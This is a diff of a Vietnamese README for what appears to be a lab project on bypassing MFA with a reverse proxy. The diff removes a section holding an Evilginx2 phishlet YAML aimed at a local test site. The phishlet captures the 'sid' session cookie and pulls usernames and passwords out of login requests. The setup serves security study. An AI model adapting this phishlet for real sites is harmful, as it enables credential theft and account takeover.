@@ -163,33 +163,6 @@ Project_IAO_MFA_bypass_by_reverse_proxy/
   - **Chế độ Public Internet (`autocert on`):** Tự đóng vai trò DNS Server để xin chứng chỉ SSL hợp lệ từ Let's Encrypt qua thử thách DNS-01.
 
 ### 4.3. Phishlet : [demo.yaml](./Tools/Evilginx2/phishlets/demo.yaml)
-Tệp YAML cấu hình cho Evilginx khi attack vào [IAO_Web_Test](./IAO_Web_Test):
-
-```yaml
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: 'login', orig_sub: '', domain: '127.0.0.1:3000', session: true, is_landing: true, auto_filter: true}
-
-sub_filters: []
-
-auth_tokens:
-  - domain: '127.0.0.1'
-    keys: ['sid']
-
-credentials:
-  username:
-    key: 'identifier'
-    search: '"(?:identifier|email)"\s*:\s*"([^"]+)"'
-    type: 'json'
-  password:
-    key: 'password'
-    search: '"password"\s*:\s*"([^"]+)"'
-    type: 'json'
-
-login:
-  domain: '127.0.0.1:3000'
-  path: '/login'
-```
 
 ---
 
